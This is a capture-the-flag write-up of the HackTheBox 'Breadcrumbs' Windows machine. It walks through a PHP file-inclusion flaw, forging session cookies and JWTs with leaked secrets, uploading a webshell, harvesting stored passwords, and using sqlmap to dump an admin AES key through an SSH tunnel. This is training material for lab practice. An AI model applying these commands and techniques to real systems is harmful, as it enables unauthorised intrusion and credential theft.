Title: Breadcrumbs writeup HackTheBox - by DarkRider88
Date: 1/3/2021
Description: Hacking into a hard level windows machine exploiting a php lfi vulnerability and then lots of enumeration for user flag and then pivoting to another port to exploit sql injection vulnerability.
Image: /assets/images/breadcrumbs-images/breadcrumbs.jpg
Level: Hard

## Enumeration

First running NMAP scan I got:

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 09:41 IST
Nmap scan report for 10.10.10.228
Host is up (0.20s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
445/tcp  open  microsoft-ds?

```

Checking port 80 there is a website running which has a book search feature

![website](/assets/images/breadcrumbs-images/website.png)

I tried few things with search feature but nothing seems interesting. And then I captured the request with burp and found an interesting parameter, method.

```http
POST /includes/bookController.php HTTP/1.1
Host: 10.10.10.228
Content-Length: 43
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.10.10.228
Referer: http://10.10.10.228/php/books.php
Cookie: PHPSESSID=t147294t2scku7jjq2io9n5psr
Connection: close

title=a&author=a&method=0
```

I changed the method value from 0 to 1 and it resulted into an error

```
HTTP/1.1 200 OK
Date: Mon, 01 Mar 2021 04:19:58 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
X-Powered-By: PHP/8.0.1
Content-Length: 361
Connection: close
Content-Type: text/html; charset=UTF-8

<br />
<b>Warning</b>:  Undefined array key "book" in <b>C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php</b> on line <b>28</b><br />
<br />
<b>Warning</b>:  file_get_contents(../books/): Failed to open stream: No such file or directory in <b>C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php</b> on line <b>28</b><br />
false
```

It says undefined key 'book' this means we are missing book.. so lets add it and again send our request to burp

![changing method and adding book](/assets/images/breadcrumbs-images/burp1.png)

you see? Now we don't have that error plus we could control the `file_get_contents(../books/test)`


After that I tried to read the bookController.php using this: 
change the request to
`book=../includes/bookController.php&method=1`

This gave me the php file and it contained reference to db.php

bookController.php
```php
<?php
if($_SERVER['REQUEST_METHOD'] == \"POST\"){    $out = \"\";    require '..\/db\/db.php';    $title = \"\";    $author = \"\";    if($_POST['method'] == 0){        if($_POST['title'] != \"\"){            $title = \"%\".$_POST['title'].\"%\";        }        if($_POST['author'] != \"\"){            $author = \"%\".$_POST['author'].\"%\";        }                    $query = \"SELECT * FROM books WHERE title LIKE ? OR author LIKE ?\";        $stmt = $con->prepare($query);        $stmt->bind_param('ss', $title, $author);        $stmt->execute();        $res = $stmt->get_result();        $out = mysqli_fetch_all($res,MYSQLI_ASSOC);    }    elseif($_POST['method'] == 1){        $out = file_get_contents('..\/books\/'.$_POST['book']);    }    else{        $out = false;    }    echo json_encode($out);}"
```

So I again sent a request now with `book=../db/db.php&method=1`
and got this

```php


"<?php\r\n\r\n$host=\"localhost\";\r\n$port=3306;\r\n$user=\"bread\";\r\n$password=\"jUli901\";\r\n$dbname=\"bread\";\r\n\r\n$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());\r\n?>\r\n"
```

```
bread:jUli901
```

Can't use this password in SSH.
So I ran gobuster to find other dirs

```bash

darkrider@sunshine:~/hackthebox/boxes/breadcrumbs$ gobuster dir -u http://10.10.10.228/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.228/
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/03/01 10:08:35 Starting gobuster
===============================================================
/Books (Status: 301)
/books (Status: 301)
/cgi-bin/ (Status: 403)
/css (Status: 301)
/db (Status: 301)
/DB (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/Index.php (Status: 200)
/index.php (Status: 200)
/js (Status: 301)
/php (Status: 301)
/PHP (Status: 301)
/portal (Status: 301)		--> interesting
/phpmyadmin (Status: 403)
/prn (Status: 403)
/prn.php (Status: 403)
/server-status (Status: 403)
/server-info (Status: 403)
/webalizer (Status: 403)
===============================================================
2021/03/01 10:10:24 Finished
===============================================================
```

So I moved to http://10.10.10.228/portal and found a login page
but we can't login using our creds

![portal login](/assets/images/breadcrumbs-images/portal-login.png)

Clicking on the helper link we get some username

```
Alex
Emma
Jack
John
Lucas
Olivia
Paul
William
```

I tried login using all but none worked So now I created an account and logged in.

After logging in I again started to see the source code of php files using the previous burp request.

for user management: `book=../portal/php/users.php&method=1`

Nothing good

Then again i checked source code for php/files.php which revealed that this page is only accessible by paul

```php
<?php
session_start();
$LOGGED_IN = false;
if ($_SESSION['username'] !== "paul") {
    header("Location: ../index.php");
}
if (isset($_SESSION['loggedIn'])) {
    $LOGGED_IN = true;
    require '../db/db.php';
} else {
    header("Location: ../auth/login.php");
    die();
}
```

So we need to hijack Paul session.
And checking under the Issues section on the website reveals that SessionId does not expire and also logout button is broken it means we can take its advantage

Let's begin with reading ../portal/cookie.php

```php
<?php
/** * @param string $username  Username requesting session cookie *  * @return string $session_cookie Returns the generated cookie *  * @devteam * Please DO NOT use default PHPSESSID; our security team says they are predictable. * CHANGE SECOND PART OF MD5 KEY EVERY WEEK * */
function makesession($username)
{
    $max            = strlen($username) - 1;
    $seed           = rand(0, $max);
    $key            = "s4lTy_stR1nG_" . $username[$seed] . "(!528./9890";
    $session_cookie = $username . md5($key);
    return $session_cookie;
}
```

And also we need jwt secret key to sign our jwt token.
Reading the authController.php
send request with following parameter
`book=../portal/authController.php&method=1`

Reading this file I found how jwt is created

```php
 session_id(makesession($username));
            session_start();
            $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
            $data = array();
            $payload = array(
                "data" => array(
                    "username" => $username
                )
            );
            $jwt = JWT::encode($payload, $secret_key, 'HS256');
```

Now take your jwt token from the burp request and decode it in jwt.io
Change the username to paul and enter the secret key

![jwt decode](/assets/images/breadcrumbs-images/jwt_decode.png)

So on `$seed = 3` of cookie.php our payload worked

login with your id and then inject the cookie and jwt then refresh the page

```
session: paul47200b180ccd6835d25d034eeb6e6390
jwt: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU

```

After that access the files link

![upload](/assets/images/breadcrumbs-images/upload.png)

Now try to upload some shell

![upload error](/assets/images/breadcrumbs-images/upload_error.png)

Time to upload a shell  and remove .zip extension from the burp request and then access it from portal/uploads

I uploaded many shells but can't get a reverse shell so I uploaded a webshell which could execute mysql commands since we have the creds

shell: https://github.com/flozz/p0wny-shell/blob/master/shell.php
and we got stable shelll


## User


Checking the C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData

We have few files reading those I got
```
juliette.json


{
	"pizza" : "margherita",
	"size" : "large",
	"drink" : "water",
	"card" : "VISA",
	"PIN" : "9890",
	"alternate" : {
		"username" : "juliette",
		"password" : "jUli901./())!",
	}
}
```

time for ssh


## Escalating to Development

I found todo.html in juliette dir

```html
<table>
        <tr>
            <th>Task</th>
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>
```

so first thing is to find those sticky notes and Searched Google for the location of sticky notes and I  found it is stored in: `C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes`

And going into that directory I found a file in LocalState directory called plum.sqlite-wal

Reading that file with `cat plum.sqlite-wal`

I got password of Development
```
development: fN3)sN5Ee@g
```

Accessing the C:\Development\ folder there lies a binary: kryptor_linux

downloading it my system and running

```
strings krypter_linux
```

I got something interesting

```
Krypter V1.2
New project by Juliette.
New features added weekly!
What to expect next update:
        - Windows version with GUI support
        - Get password from cloud and AUTOMATICALLY decrypt!
Requesting decryption key from cloud...
Account: Administrator
http://passmanager.htb:1234/index.php
method=select&username=administrator&table=passwords
Server response:
Incorrect master key
No key supplied.
USAGE:
Krypter <key>
```

So there is a service running on the port 1234 and we can also confirm this using 
```bash
netstat -ano 
```
Time to do the port forwarding

I did this with ssh
```bash
ssh development@10.10.10.228 -L 1234:127.0.0.1:1234
```

after that I sent curl request

```bash
$ curl http://127.0.0.1:1234/index.php -X POST -d "method=select&username=administrator&table=passwords"

selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}

```

This is the key, but what should we decrypt..?

So I ran sqlmap on this url

```bash

sqlmap -u http://127.0.0.1:1234/index.php --data="method=select&username=administrator&table=passwords" --dump
```

I got following things

```bash
+----+---------------+------------------+----------------------------------------------+
| id | account       | aes_key          | password                                     |
+----+---------------+------------------+----------------------------------------------+
| 1  | Administrator | k19D193j.<19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= |
+----+---------------+------------------+----------------------------------------------+
```


Go to Cyberchef and select the AES decrypt

Then convert the base64 password ---> hex ---> AES decrypt

![aes decrypt](/assets/images/breadcrumbs-images/aes.png)

got the password
```
p@ssw0rd!@#$9890./
```

Rooted